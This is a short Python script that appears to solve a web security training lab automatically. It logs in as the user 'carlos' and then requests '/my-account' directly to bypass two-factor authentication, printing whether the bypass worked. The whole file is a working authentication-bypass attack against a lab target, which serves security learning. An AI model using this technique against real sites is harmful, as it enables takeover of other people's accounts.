from ...utils import print_info, print_info_secondary, print_success, print_fail


def solve_lab(session):
    session.login("carlos", "montoya", with_csrf=False)

    path = "/my-account"
    print_info(f'Bypassing 2FA by manually navigating to "{path}"...')

    resp = session.get_path(path)
    if resp.status_code != 200:
        print_fail("Unable to bypass 2FA.")
    else:
        print_success("Success.\n")
